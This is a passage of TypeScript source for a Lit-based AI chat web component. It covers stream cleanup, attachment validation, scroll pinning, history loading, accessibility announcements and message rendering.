          emitBackground(true);
        }
      } else if (!detached && isOrphaned() && this.abortOnSwitch) {
        // Opted out: the stream was abandoned mid-flight. Nothing to clean up in
        // the visible list (the message is gone), but the controller may still
        // be ours, so release the busy state.
        if (this._abort === controller) {
          this._abort = undefined;
          this._busy = false;
        }
      }
      // Only run cleanup if THIS send still owns the current stream. If a newer
      // send/clear replaced our controller (e.g. New-chat mid-stream), leave the
      // shared _busy/_abort alone — they now belong to the newer stream.
      if (!detached && this._abort === controller) {
        this._patch(assistant.id, (m) => ({ ...m, streaming: false }));
        this._busy = false;
        this._abort = undefined;
        const final = this.messages.find((m) => m.id === assistant.id);
        // Announce the settled turn to screen readers ONCE (not per token). All
        // three terminal states get a spoken result: the reply text, the error,
        // or the empty-response note. Uses the (overridable) labels for the
        // non-content cases so it's translatable.
        if (final?.error) {
          this._announce(final.error);
        } else if (final && !final.content) {
          this._announce(this._labels.emptyResponse);
        } else if (final) {
          this._announce(final.content);
        }
        // Only announce a completed turn when it actually produced content.
        // Skipping empties (and errors) keeps consumers who persist on
        // `ai-chat:message` from saving blank ghost turns to their history.
        if (final && !final.error && final.content) {
          this.dispatchEvent(
            new CustomEvent('ai-chat:message', {
              detail: { message: final },
              bubbles: true,
              composed: true,
            }),
          );
        }
      }
    }
    return true;
  }

  /**
   * Announce text via the visually-hidden aria-live region. Clears first, then
   * sets on the next microtask, so two identical consecutive replies still each
   * trigger an announcement (a live region ignores an unchanged text node).
   */
  private _announce(text: string): void {
    if (!text) return;
    this._announcement = '';
    void this.updateComplete.then(() => {
      this._announcement = text;
    });
  }

  private _patch(id: string, fn: (m: ChatMessage) => ChatMessage): void {
    this.messages = this.messages.map((m) => (m.id === id ? fn(m) : m));
  }

  private _emitError(error: string): void {
    this.dispatchEvent(
      new CustomEvent('ai-chat:error', {
        detail: { error },
        bubbles: true,
        composed: true,
      }),
    );
  }

  private _onSubmit(e: Event): void {
    e.preventDefault();
    const text = this._input.trim();
    const atts = this._pending;
    // Nothing to send (no text AND no attachment), or a generation is in flight.
    // In both cases leave the box untouched so the user's text survives. The ⏹
    // stop button handles the running stream. (`send()` also guards these, but we
    // check here so we only clear the input when the message is actually accepted
    // — send() doesn't resolve until the whole stream finishes, too late to clear.)
    if ((!text && atts.length === 0) || this._busy) return;

    // Accepted: clear the box + attachment tray now and kick off the send.
    this._input = '';
    this._pending = [];
    if (this._textarea) {
      this._textarea.style.height = 'auto';
      this._textarea.style.overflowY = 'hidden';
    }
    void this.send(text, atts);
    // Keep focus in the composer. On Enter it's already there, but a *click* on
    // the Send button moved focus onto it — and it's immediately swapped for the
    // Stop button, so focus would be lost. Return it to the input either way.
    this._focusComposer();
  }

  // ── Attachments ─────────────────────────────────────────────────────────

  /**
   * Open the native file picker programmatically. Useful with
   * `hide-attach-button` when you provide your own trigger (e.g. a button in the
   * `composer-actions-start` slot). No-op unless `allow-attachments` is set.
   */
  openFilePicker(): void {
    if (!this.allowAttachments || this.disabled) return;
    this._fileInput?.click();
  }

  /** Attach-button click handler. */
  private _openPicker(): void {
    this.openFilePicker();
  }

  /** Native <input type=file> change: ingest the picked files, then reset the
   *  input so picking the SAME file again still fires a change event. */
  private _onFilePick(e: Event): void {
    const input = e.target as HTMLInputElement;
    if (input.files) void this._ingest(input.files);
    input.value = '';
  }

  private _onDragOver(e: DragEvent): void {
    if (!this.allowAttachments || this.disabled) return;
    // Signal we'll accept a drop (otherwise the browser navigates to the file).
    e.preventDefault();
    this._dragging = true;
  }

  private _onDragLeave(e: DragEvent): void {
    // Only clear when the pointer actually leaves the composer, not when moving
    // between child elements (which fire dragleave on the parent).
    if (e.currentTarget === e.target) this._dragging = false;
  }

  private _onDrop(e: DragEvent): void {
    if (!this.allowAttachments || this.disabled) return;
    e.preventDefault();
    this._dragging = false;
    if (e.dataTransfer?.files?.length) void this._ingest(e.dataTransfer.files);
  }

  /** Paste handler on the textarea: only intercept when the clipboard carries a
   *  file/image. Plain-text paste is left entirely to the browser. */
  private _onPaste(e: ClipboardEvent): void {
    if (!this.allowAttachments || this.disabled) return;
    const files = e.clipboardData?.files;
    if (!files || files.length === 0) return; // text paste — do nothing special
    e.preventDefault(); // we're taking over: don't also paste the image as text
    void this._ingest(files, /* fromPaste */ true);
  }

  /**
   * Validate and add a batch of files to the pending tray. Each file is checked
   * against `accept`, `max-attachment-size`, and `max-attachments`; rejects fire
   * `ai-chat:attach-rejected`. Accepted files are read to a data URL for preview
   * and sending, then surfaced via a cancelable `ai-chat:attach` (so a consumer
   * can upload + swap the url before send).
   */
  private async _ingest(list: FileList, fromPaste = false): Promise<void> {
    if (!this.allowAttachments || this.disabled) return;
    const added: Attachment[] = [];
    for (const file of Array.from(list)) {
      if (this._pending.length + added.length >= this.maxAttachments) {
        this._rejectFile(file, 'too-many', this._labels.attachTooMany);
        break;
      }
      if (!this._typeAllowed(file)) {
        this._rejectFile(
          file,
          'type',
          this._fill(this._labels.attachWrongType, file.name),
        );
        continue;
      }
      if (this.maxAttachmentSize > 0 && file.size > this.maxAttachmentSize) {
        this._rejectFile(
          file,
          'size',
          this._fill(this._labels.attachTooLarge, file.name),
        );
        continue;
      }
      const name =
        file.name ||
        `pasted-${fromPaste ? 'image' : 'file'}-${++this._pasteCount}${this._extFor(file.type)}`;
      const url = await this._readAsDataURL(file);
      added.push({
        id: nextId(),
        kind: file.type.startsWith('image/') ? 'image' : 'file',
        mimeType: file.type || 'application/octet-stream',
        name,
        size: file.size,
        url,
        file,
      });
    }
    if (added.length === 0) return;
    this._pending = [...this._pending, ...added];

    // Let the consumer react (e.g. upload to storage and swap `url`) before send.
    // Cancelable: preventDefault removes the just-added attachments (the consumer
    // is handling them entirely themselves).
    const ev = new CustomEvent('ai-chat:attach', {
      detail: { attachments: added },
      bubbles: true,
      composed: true,
      cancelable: true,
    });
    if (!this.dispatchEvent(ev)) {
      const ids = new Set(added.map((a) => a.id));
      this._pending = this._pending.filter((a) => !ids.has(a.id));
    }
  }

  /** Remove a staged attachment (chip × button). */
  private _removeAttachment(id: string): void {
    this._pending = this._pending.filter((a) => a.id !== id);
    this._focusComposer();
  }

  private _rejectFile(file: File, reason: string, message: string): void {
    this._announce(message);
    this.dispatchEvent(
      new CustomEvent('ai-chat:attach-rejected', {
        detail: { file, reason, message },
        bubbles: true,
        composed: true,
      }),
    );
  }

  /** Does `file` satisfy the `accept` attribute? Mirrors the browser's own
   *  matching: `*`, `image/*`, an exact MIME type, or a `.ext`. */
  private _typeAllowed(file: File): boolean {
    const accept = this.accept.trim();
    if (!accept || accept === '*' || accept === '*/*') return true;
    const type = (file.type || '').toLowerCase();
    const name = file.name.toLowerCase();
    return accept.split(',').some((raw) => {
      const t = raw.trim().toLowerCase();
      if (!t) return false;
      if (t.startsWith('.')) return name.endsWith(t);
      if (t.endsWith('/*')) return type.startsWith(t.slice(0, -1)); // "image/"
      return type === t;
    });
  }

  private _fill(template: string, name: string): string {
    return template.replace('{name}', name);
  }

  /** Best-effort file extension from a MIME type, for naming pasted files. */
  private _extFor(mime: string): string {
    const map: Record<string, string> = {
      'image/png': '.png',
      'image/jpeg': '.jpg',
      'image/gif': '.gif',
      'image/webp': '.webp',
      'image/svg+xml': '.svg',
    };
    return map[mime] ?? '';
  }

  private _readAsDataURL(file: Blob): Promise<string> {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(String(reader.result));
      reader.onerror = () => reject(reader.error);
      reader.readAsDataURL(file);
    });
  }

  override connectedCallback(): void {
    super.connectedCallback();
    // Esc stops an in-flight generation. We listen on `document` (not just the
    // host) so it works no matter where focus is — including after the user
    // clicks the non-focusable message area, which otherwise moves focus out of
    // the widget and the host-level keydown would never fire. The `_busy` guard
    // means only a widget that's actually streaming reacts.
    document.addEventListener('keydown', this._onHostKeydown);
  }

  protected override firstUpdated(): void {
    // Watch a sentinel at the bottom of the scroller. When it's visible the user
    // is at (or effectively at) the bottom, so we keep following new content;
    // when it scrolls out of view (user scrolled up, or content grew past it) we
    // stop pinning. `root: _scrollEl` scopes intersection to the scroll region.
    // The sentinel only exists while there are messages, so observation is
    // (re)wired in updated() as it appears/disappears.
    if ('IntersectionObserver' in window && this._scrollEl) {
      this._bottomObserver = new IntersectionObserver(
        (entries) => {
          const atBottom = entries[0]?.isIntersecting ?? true;
          this._stickToBottom = atBottom;
          if (this._showJump === atBottom) this._showJump = !atBottom;
        },
        { root: this._scrollEl, threshold: 0 },
      );
      if (this._sentinel) this._bottomObserver.observe(this._sentinel);
      // Older messages start loading a little before the top comes into view,
      // so a reader scrolling up rarely has to wait at the edge.
      this._topObserver = new IntersectionObserver(
        (entries) => {
          if (entries.some((e) => e.isIntersecting)) this._autoLoadEarlier();
        },
        { root: this._scrollEl, rootMargin: '200px 0px 0px 0px', threshold: 0 },
      );
    }
  }

  /** The top came into view: ask for older messages, if the reader is actually reading back. */
  private _autoLoadEarlier(): void {
    if (this.loadEarlier !== 'scroll') return;
    const el = this._scrollEl;
    // A long conversation opens pinned to the bottom with its top momentarily
    // in view before the first scroll lands; that is not the reader going back.
    // A short one that doesn't fill the view is: load until it does.
    const overflows = el ? el.scrollHeight > el.clientHeight : false;
    if (this._stickToBottom && overflows) return;
    this._requestEarlier();
  }

  /** Fire `ai-chat:load-earlier` once; the next waits for `prependMessages()`. */
  private _requestEarlier(): void {
    if (!this.hasEarlier || this._loadingEarlier || this.messages.length === 0) return;
    this._loadingEarlier = true;
    this._earlierAnchor = this.messages[0];
    this.dispatchEvent(
      new CustomEvent('ai-chat:load-earlier', {
        detail: { conversationId: this.conversationId ?? null, oldest: this.messages[0] },
        bubbles: true,
        composed: true,
      }),
    );
  }

  /**
   * Observe the top sentinel afresh: IntersectionObserver only reports CHANGES,
   * so a sentinel still in view after a load (the history is still too short to
   * fill the view) would otherwise never ask for the next page.
   */
  private _recheckTop(): void {
    if (!this._topObserver) return;
    if (this._observedTop) this._topObserver.unobserve(this._observedTop);
    this._observedTop = this._topSentinel ?? undefined;
    if (this._observedTop) this._topObserver.observe(this._observedTop);
  }

  override disconnectedCallback(): void {
    document.removeEventListener('keydown', this._onHostKeydown);
    this._bottomObserver?.disconnect();
    this._bottomObserver = undefined;
    this._topObserver?.disconnect();
    this._topObserver = undefined;
    this._observedTop = undefined;
    // A background stream outlives the conversation it started in, but it must
    // not outlive the ELEMENT — nobody is listening for its events any more, so
    // letting it run would just burn tokens. Cancel every detached request.
    for (const { controller } of this._detached.values()) controller.abort();
    for (const controller of this._untagged) controller.abort();
    this._detached.clear();
    this._untagged.clear();
    super.disconnectedCallback();
  }

  private _onHostKeydown = (e: KeyboardEvent): void => {
    if (e.key !== 'Escape') return;
    // The preview overlay is the topmost surface, so Esc closes it first.
    if (this._preview) {
      e.preventDefault();
      this._closePreview();
      return;
    }
    if (this._busy) {
      e.preventDefault();
      this.stop();
    }
  };

  private _onKeydown(e: KeyboardEvent): void {
    // Esc (while streaming) is handled at the host level; let it bubble there.
    if (e.key === 'Escape') return;
    // Enter sends, Shift+Enter inserts a newline.
    if (e.key === 'Enter' && !e.shiftKey && !e.isComposing) {
      e.preventDefault();
      this._onSubmit(e);
    }
  }

  /** Fallback cap (px) if the CSS var can't be read. */
  private static readonly MAX_INPUT_HEIGHT = 200;

  private _onInput(e: Event): void {
    const ta = e.target as HTMLTextAreaElement;
    this._input = ta.value;
    this._autosize(ta);
  }

  /** Read --ai-chat-input-max-height (px) so JS and CSS stay in sync; the
   *  consumer can raise/lower the cap with one CSS variable. */
  private _maxInputHeight(): number {
    const raw = getComputedStyle(this).getPropertyValue(
      '--ai-chat-input-max-height',
    );
    const px = parseInt(raw, 10);
    return Number.isFinite(px) && px > 0 ? px : AiChat.MAX_INPUT_HEIGHT;
  }

  /** Grow the textarea to fit its content, capping at the max-height. Only then
   *  does an internal scrollbar appear — never on a single line. */
  private _autosize(ta: HTMLTextAreaElement): void {
    const max = this._maxInputHeight();
    ta.style.height = 'auto';
    const needed = ta.scrollHeight;
    ta.style.height = `${Math.min(needed, max)}px`;
    ta.style.overflowY = needed > max ? 'auto' : 'hidden';
  }

  /** Event-delegated copy-to-clipboard for code blocks. */
  private _onMessagesClick(e: Event): void {
    const target = e.target as HTMLElement;
    const btn = target.closest('.code-block__copy') as HTMLButtonElement | null;
    if (!btn) return;
    const code =
      btn.closest('.code-block')?.querySelector('code')?.textContent ?? '';
    const { copy, copied } = this._labels;
    void navigator.clipboard?.writeText(code).then(() => {
      btn.textContent = copied;
      window.setTimeout(() => {
        btn.textContent = copy;
      }, 1200);
    });
  }

  private _observedSentinel?: Element;

  protected override updated(changed: PropertyValues): void {
    // The sentinel only exists while there are messages; (re)observe it as it
    // appears or disappears so the bottom-detection observer stays wired up.
    if (this._bottomObserver && this._sentinel !== this._observedSentinel) {
      if (this._observedSentinel)
        this._bottomObserver.unobserve(this._observedSentinel);
      if (this._sentinel) this._bottomObserver.observe(this._sentinel);
      this._observedSentinel = this._sentinel;
    }

    // Auto-follow new content only while pinned. `_stickToBottom` is maintained
    // by the IntersectionObserver (bottom visible) AND cleared immediately by a
    // real upward scroll (see _onScroll) — we must NOT re-derive "near bottom"
    // from post-append geometry here, because appended content grows scrollHeight
    // before scrollTop catches up, which would read as "not at bottom" and stop
    // following mid-stream.
    // Older messages added above never move the reader (prependMessages keeps
    // their place itself).
    if (changed.has('messages') && this._stickToBottom && !this._prepending) {
      this._scrollToBottom();
    }

    // The top sentinel comes and goes with `has-earlier`; keep it observed.
    if ((this._topSentinel ?? undefined) !== this._observedTop) this._recheckTop();

  }

  /**
   * A `.messages` swap can orphan a streaming turn (conversation switch). The
   * send loop detaches itself on its next chunk, but that may be a while off —
   * or never, if the stream has gone quiet. Release the composer as part of THIS
   * update so the conversation you just switched TO is immediately usable rather
   * than stuck showing a Stop button for a reply that isn't yours any more.
   *
   * Done in `willUpdate` rather than `updated` so the state change lands before
   * the render, instead of scheduling a second one.
   */
  protected override willUpdate(changed: PropertyValues): void {
    // A load that was out for a conversation no longer on screen will never be
    // answered here; free the control for the one that is.
    if (
      this._loadingEarlier &&
      !this._prepending &&
      (changed.has('conversationId') || (changed.has('messages') && this.messages[0] !== this._earlierAnchor))
    ) {
      this._loadingEarlier = false;
      this._earlierAnchor = undefined;
    }
    if (this.abortOnSwitch) return;
    if (!changed.has('messages') && !changed.has('conversationId')) return;

    // The visible conversation changed. If the turn we were streaming is no
    // longer on screen, push it to the background NOW (so switching back can
    // resume it) and release the composer — otherwise it'd be stuck showing
    // Stop for a reply that isn't in this conversation any more.
    if (this._busy && !this.messages.some((m) => m.streaming)) {
      this._detachActive?.();
      this._busy = false;
      this._abort = undefined;
    }
    // ...and if the conversation we just switched TO has a reply still
    // generating, put it back on screen so it keeps streaming live.
    this._resumeDetachedForView();
  }

  /**
   * A real scroll event. Detects an upward scroll and unpins immediately — this
   * beats the async IntersectionObserver to the punch, killing the slow-scroll
   * jitter without the post-append geometry problems of measuring in updated().
   * (The observer still handles re-pinning and the jump button.)
   */
  private _lastScrollTop = 0;
  private _lastScrollHeight = 0;
  private _onScroll(e: Event): void {
    const el = e.currentTarget as HTMLElement;
    const top = el.scrollTop;
    // Only a REAL upward drag unpins. Mid-stream, each token re-renders the
    // message's markdown, and the rendered content can suddenly change height —
    // most notably SHRINK when prose collapses into a code block/table. Pinned
    // at the bottom, that shrink makes the browser clamp scrollTop down to the
    // new max and fire a scroll event that looks identical to the user scrolling
    // up — which used to kill auto-follow exactly when markdown styling kicked
    // in. Disambiguate by where we END UP: a clamp/reflow leaves us AT the
    // bottom (or with grown content); a user's upward scroll moves us AWAY from
    // the bottom with unchanged content. Only the latter unpins.
    const grew = el.scrollHeight > this._lastScrollHeight;
    const atBottom = el.scrollHeight - top - el.clientHeight <= 2;
    if (!grew && !atBottom && top < this._lastScrollTop - 1) {
      this._stickToBottom = false;
    }
    this._lastScrollTop = top;
    this._lastScrollHeight = el.scrollHeight;
  }

  private _scrollToBottom(smooth = false): void {
    const el = this._scrollEl;
    if (!el) return;
    // scrollTo({behavior:'smooth'}) ignores the CSS `scroll-behavior: auto`
    // override, so honor prefers-reduced-motion here in JS or reduced-motion
    // users still get an animated scroll (WCAG 2.3.3).
    const reduce =
      typeof matchMedia === 'function' &&
      matchMedia('(prefers-reduced-motion: reduce)').matches;
    requestAnimationFrame(() => {
      el.scrollTo({
        top: el.scrollHeight,
        behavior: smooth && !reduce ? 'smooth' : 'auto',
      });
      // Sync the baseline so our own downward scroll isn't later misread as the
      // user scrolling up, and record the height we scrolled within.
      this._lastScrollTop = el.scrollTop;
      this._lastScrollHeight = el.scrollHeight;
    });
  }

  private _jumpToBottom(): void {
    // Scroll to the bottom; the IntersectionObserver will see the sentinel come
    // back into view and re-pin _stickToBottom / hide the jump button.
    this._scrollToBottom(true);
  }

  override render() {
    const hasMessages = this.messages.length > 0;
    // Optional history sidebar. Off by default: when `show-aside` isn't set the
    // aside column isn't rendered at all, so a plain chat is completely
    // unaffected. Structure mirrors ChatGPT/Claude: a fixed top holding the
    // full-width New-chat button, then the consumer's scrolling conversation
    // list in the `aside` slot (see the `new-chat` event + README history pattern).
    const aside = this.showAside
      ? html`<aside class="aside" part="aside">
          ${
            this.showClear
              ? html`<div class="aside__top">${this._renderNewChatButton('block')}</div>`
              : nothing
          }
          <div class="aside__list" part="aside-list"><slot name="aside"></slot></div>
        </aside>`
      : nothing;
    return html`
      ${this._renderAvatarSources()}
      <div class="layout" part="layout">
        ${aside}
        <div class="root" part="root">
          ${this._renderHeader()}
          <div class="scroll-region">
            <!-- role="log" gives the list structure/navigation, but NO aria-live:
                 a polite live region re-announces on every mutation, so streaming
                 deltas would spam a growing partial message token-by-token. The
                 settled reply is announced once via the hidden region below. -->
            <div class="messages" part="messages"
                 @click=${this._onMessagesClick} @scroll=${this._onScroll}
                 role="log" aria-label=${this._labels.messagesRegion}>
              ${hasMessages && this.hasEarlier ? this._renderEarlier() : nothing}
              ${hasMessages ? this._renderMessages() : this._renderEmpty()}
              <!-- Bottom sentinel watched by the IntersectionObserver to decide
                   whether we're pinned to the bottom (see firstUpdated). Only
                   rendered when there are messages — the full-height empty state
                   plus a trailing sentinel would otherwise overflow and show a
                   scrollbar on an empty chat. -->
              ${hasMessages ? html`<div class="scroll-sentinel" aria-hidden="true"></div>` : nothing}
            </div>
            <!-- The single polite live region: screen readers hear the settled
                 assistant reply (or error / empty note) ONCE per turn from here,
                 never the streaming partials. Visually hidden. -->
            <div class="sr-live" role="status" aria-live="polite" aria-atomic="true">
              ${this._announcement}
            </div>
            ${
              this._showJump
                ? html`<button class="jump" part="jump-button" type="button"
                       @click=${this._jumpToBottom} aria-label=${this._labels.jumpToLatest}>
                       <slot name="jump-icon">${chevronDownIcon}</slot>
                     </button>`
                : nothing
            }
          </div>
          ${this._renderComposer()}
        </div>
        ${this._renderPreview()}
      </div>
    `;
  }

  /**
   * The chat-column top bar (spans the chat only, not the sidebar — ChatGPT/
   * Claude style). A `header` slot replaces it wholesale. The built-in bar
   * renders when `show-header` is set and holds the title.
   *
   * The New-chat button lives in the SIDEBAR when one is shown (`show-aside`).
   * Only when there's no sidebar does `show-clear` place the button here: in the
   * header if present, otherwise floating over the top-right of the messages.
   */
  private _renderHeader() {
    // Button belongs in the header only when there's no sidebar to hold it.
    const clearInHeader = this.showClear && !this.showAside;
    const builtIn = this.showHeader
      ? html`<div class="header" part="header">
          <span class="header__title" part="header-title">${this._labels.headerTitle}</span>
          ${clearInHeader ? this._renderNewChatButton('icon') : nothing}
        </div>`
      : nothing;
    // A slotted header replaces the built-in bar's content — but it should keep
    // the bar's frame (padding + divider), not land in a bare div. CSS can't see
    // slot occupancy, so the class is set here.
    const slottedHeader = this._hasSlotted('header');
    return html`<div class="header-slot ${slottedHeader ? 'header-slot--filled' : ''}"
        part="header-slot"><slot name="header" @slotchange=${this._onSlotChange}>${builtIn}</slot></div>
      ${
        clearInHeader && !this.showHeader
          ? html`<div class="clear-float">${this._renderNewChatButton('icon')}</div>`
          : nothing
      }`;
  }

  /**
   * The New-chat button in one of two shapes:
   * - `'block'`: full-width labeled button for the top of the sidebar.
   * - `'icon'`:  compact icon-only button for the header / floating fallback.
   */
  private _renderNewChatButton(shape: 'block' | 'icon') {
    if (shape === 'block') {
      return html`<button class="new-chat-btn" part="clear-button" type="button"
          @click=${this._onNewChat} aria-label=${this._labels.clearChat}>
          <slot name="clear-icon">${newChatIcon}</slot>
          <span class="new-chat-btn__label">${this._labels.clearChat}</span>
        </button>`;
    }
    return html`<button class="clear-btn" part="clear-button" type="button"
        @click=${this._onNewChat} aria-label=${this._labels.clearChat}
        title=${this._labels.clearChat}>
        <slot name="clear-icon">${newChatIcon}</slot>
      </button>`;
  }

  /**
   * The New-chat button. Emits `ai-chat:new-chat` carrying the outgoing
   * conversation so a consumer with a history sidebar can save it before it's
   * cleared, then clears to a fresh conversation. Call `preventDefault()` on the
   * event to keep the current messages (e.g. you're managing state yourself).
   */
  private _onNewChat = (): void => {
    const ev = new CustomEvent('ai-chat:new-chat', {
      detail: { messages: this.messages },
      bubbles: true,
      composed: true,
      cancelable: true,
    });
    const proceed = this.dispatchEvent(ev);
    if (proceed) this.clear();
  };

  private _renderEmpty() {
    const { emptyHeading, emptyBody } = this._labels;
    // The whole empty state can be replaced via the `empty` slot; otherwise the
    // icon/heading/body are individually overridable (icon via slot, text via
    // labels). No heading text renders if the user cleared it.
    return html`
      <div class="empty" part="empty">
        <slot name="empty">
          <div class="empty__inner">
            <div class="empty__icon" part="empty-icon" aria-hidden="true">
              <slot name="empty-icon">${emptyChatIcon}</slot>
            </div>
            ${
              emptyHeading
                ? html`<p class="empty__heading" part="empty-heading">${emptyHeading}</p>`
                : nothing
            }
            ${
              emptyBody
                ? html`<p class="empty__body" part="empty-body">${emptyBody}</p>`
                : nothing
            }
          </div>
        </slot>
      </div>
    `;
  }

  /** Bumped on slotchange to re-render slot-dependent bits (e.g. avatars). */
  @state() private _slotVersion = 0;

  private _onSlotChange = (): void => {
    this._slotVersion++;
  };

  /**
   * True when the consumer has put content in the given named slot. CSS can't
   * answer this (projected nodes aren't children of <slot>), so we look for a
   * light-DOM child carrying the slot name. Referencing `_slotVersion` keeps
   * callers re-evaluating whenever slotted content changes.
   */
  private _hasSlotted(name: string): boolean {
    void this._slotVersion;
    return !!this.querySelector(`[slot="${name}"]`);
  }

  /**
   * A copy of the avatar the consumer slotted, for one message.
   *
   * Avatars appear once per message, but a slotted node is a single live DOM
   * node: it can only ever be projected into ONE <slot>, so rendering
   * `<slot name="user-avatar">` in every message leaves all but the first
   * empty. Instead the real projection lives in one hidden slot per role
   * (see `_renderAvatarSources`) and each message renders a clone.
   *
   * Clones are inert copies — a consumer's listeners/framework bindings stay on
   * the original only. That's an accepted trade: avatars are decorative and
   * `aria-hidden`, so nothing interactive belongs here.
   */
  private _avatarClone(name: string) {
    void this._slotVersion;
    const sources = this.querySelectorAll(`[slot="${name}"]`);
    if (!sources.length) return nothing;
    const frag = document.createDocumentFragment();
    for (const el of sources) {
      const copy = el.cloneNode(true) as HTMLElement;
      copy.removeAttribute('slot');
      frag.appendChild(copy);
    }
    return frag;
  }

  /**
   * The real projection points for avatar slots, kept out of view. These exist
   * so `<span slot="user-avatar">` stays the authoring API and `slotchange`
   * still fires; the visible avatars are clones of what lands here.
   */
  private _renderAvatarSources() {
    return html`
      <div class="avatar-sources" aria-hidden="true">
        <slot name="assistant-avatar" @slotchange=${this._onSlotChange}></slot>
        <slot name="user-avatar" @slotchange=${this._onSlotChange}></slot>
      </div>
    `;
  }

  /** The top of a conversation with older history: the trigger, and the sentinel that loads on scroll. */
  private _renderEarlier() {
    const loading = this._loadingEarlier;
    return html`<div class="earlier" part="load-earlier-row">
      <div class="top-sentinel" aria-hidden="true"></div>
      <button class="earlier__button" part="load-earlier" type="button"
              ?disabled=${loading} aria-busy=${loading ? 'true' : 'false'}
              @click=${this._requestEarlier}>
        ${loading ? this._labels.loadingEarlier : this._labels.loadEarlier}
      </button>
    </div>`;
  }

  private _renderMessages() {
    return repeat(
      this.messages,
      (m) => m.id,
      (m) => this._renderMessage(m),
    );
  }

  private _renderMessage(m: ChatMessage) {
    const classes = classMap({
      message: true,
      [`message--${m.role}`]: true,
      'message--streaming': !!m.streaming,
      // Lets the bubble stretch for a comfortable editing width (CSS scopes the
      // widening to this message only).
      'message--editing': this._editingId === m.id,
    });
    const isAssistant = m.role === 'assistant';
    // Avatars are opt-in: provide an `assistant-avatar` / `user-avatar` slot to
    // show one (an SVG, <img>, initial, emoji — anything). With no slot the
    // avatar column collapses. Slot occupancy can't be detected in CSS —
    // projected light-DOM nodes never become children of <slot>, so a
    // `:has(slot > *)` rule never matches — hence the JS check below.
    const avatarSlot = isAssistant ? 'assistant-avatar' : 'user-avatar';
    const avatarSrc = isAssistant ? this.assistantAvatarSrc : this.userAvatarSrc;
    const hasAvatar = Boolean(avatarSrc) || this._hasSlotted(avatarSlot);
    // A URL is a plain <img>; a slot is cloned, not projected — one slotted
    // node can't project into every message.
    const avatar = avatarSrc
      ? html`<img src=${avatarSrc} alt="" decoding="async">`
      : this._avatarClone(avatarSlot);
    const name = isAssistant
      ? this._labels.assistantName
      : this._labels.userName;
    const showMeta = this.showNames || this.showTimestamps;
    return html`
      <div class=${classes} part="message message-${m.role}" data-role=${m.role}>
        <div class="message__avatar ${hasAvatar ? 'message__avatar--filled' : ''}"
             part="avatar" aria-hidden="true">
          ${avatar}
        </div>
        <div class="message__col">
          ${
            showMeta
              ? html`<div class="message__meta" part="meta">
                ${
                  this.showNames
                    ? html`<span class="message__name" part="name">${name}</span>`
                    : nothing
                }
                ${
                  this.showTimestamps
                    ? html`<time class="message__time" part="time"
                           datetime=${new Date(m.createdAt).toISOString()}>
                           ${this._formatTime(m.createdAt)}
                         </time>`
                    : nothing
                }
              </div>`
              : nothing
          }
        ${
          // Attachments render OUTSIDE the bubble: an image shouldn't sit on a
          // colored bubble background (it looks boxed-in). The image floats on
          // its own with rounded corners, and any accompanying text gets its own
          // bubble BELOW it — the iMessage/ChatGPT/Claude treatment.
          this._renderMessageAttachments(m)
        }
        ${
          // No bubble at all for an image-only turn — an empty colored rectangle
          // under the image is exactly the "looks bad" case.
          this._hasBubbleContent(m)
            ? html`<div class="message__body" part="bubble">
          ${
            this._editingId === m.id
              ? this._renderEditForm(m)
              : isAssistant
                ? this._renderMarkdown(m)
                : m.content
                  ? html`<div class="plain">${m.content}</div>`
                  : nothing
          }
          ${
            m.streaming && !m.content
              ? html`<span class="typing" aria-label=${this._labels.typing}><i></i><i></i><i></i></span>`
              : nothing
          }
          ${
            // Finished with no content and no error → show a placeholder instead
            // of a blank ghost bubble (e.g. an empty upstream response).
            isAssistant && !m.streaming && !m.content && !m.error
              ? html`<div class="empty-response" part="empty-response">${this._labels.emptyResponse}</div>`
              : nothing
          }
          ${
            m.error
              ? html`<div class="message__error" part="error" role="alert">
                <span class="message__error-icon" aria-hidden="true">
                  <slot name="error-icon">${alertIcon}</slot>
                </span>
                <span class="message__error-text">${m.error}</span>
                ${
                  this.showRetry && !this._busy
                    ? html`<button class="retry-btn" part="retry-button" type="button"
                           @click=${() => this.retry()} aria-label=${this._labels.retry}>
                           <slot name="retry-icon">${retryIcon}</slot>
                           <span>${this._labels.retry}</span>
                         </button>`
                    : nothing
                }
              </div>`
              : nothing
          }
        </div>`
            : nothing
        }
        ${this._renderMessageActions(m)}
        </div>
      </div>
    `;
  }

  /**
   * Does this message need a bubble at all? An image-only turn shouldn't render
   * an empty colored rectangle under the image — the attachments render on their
   * own, outside the bubble. A bubble is needed for text, the typing indicator,
   * the empty-response placeholder, an error, or while editing.
   */
  private _hasBubbleContent(m: ChatMessage): boolean {
    if (this._editingId === m.id) return true;
    if (m.content) return true;
    if (m.error) return true;
    if (m.streaming) return true; // typing indicator lives in the bubble
    // Settled assistant turn with no content/error shows the empty-response note.
    return m.role === 'assistant';
  }

  /**
   * Per-message actions row (copy, edit, and consumer-slotted actions). Rendered
   * under the bubble, revealed on hover/focus. Skipped while streaming and for
   * messages with no content (an error-only or empty turn has nothing to act on).
   * The row still renders when built-ins are off if the consumer has slotted
   * custom actions — that check happens in slice 2.
   */
  private _renderMessageActions(m: ChatMessage) {
    // No actions row while this message is in edit mode (Save/Cancel take over).
    if (m.streaming || !m.content || this._editingId === m.id) return nothing;
    const isUser = m.role === 'user';
    const showCopy = this.showCopy;
    const showEdit = this.showEdit && isUser;
    if (!showCopy && !showEdit) return nothing;
    return html`
      <div class="message__actions" part="message-actions" role="group"
           aria-label=${this._labels.copyMessage}>
        ${
          showCopy
            ? html`<button class="message__action" part="action-button copy-button"
                     type="button" title=${this._labels.copyMessage}
                     aria-label=${this._labels.copyMessage}
                     @click=${(e: Event) => this._onCopyMessage(e, m)}>
                     <slot name="copy-icon">${copyIcon}</slot>
                   </button>`
            : nothing
        }
        ${
          showEdit
            ? html`<button class="message__action" part="action-button edit-button"
                     type="button" title=${this._labels.edit}
                     aria-label=${this._labels.edit}
                     @click=${() => this._startEdit(m)}>
                     <slot name="edit-icon">${editIcon}</slot>
                   </button>`
            : nothing
        }
      </div>
    `;
  }

  /** Begin editing a user message (implemented in the edit slice). */
  /**
   * Inline edit form shown in place of a user bubble's text. Enter saves,
   * Shift+Enter inserts a newline, Esc cancels — mirroring the composer's
   * keyboard model so it feels native.
   */
  private _renderEditForm(m: ChatMessage) {
    const onKeydown = (e: KeyboardEvent) => {
      if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        this._confirmEdit(m);
      } else if (e.key === 'Escape') {
        e.preventDefault();
        this._cancelEdit();
      }
    };
    return html`
      <div class="message__edit" part="message-edit">
        <textarea
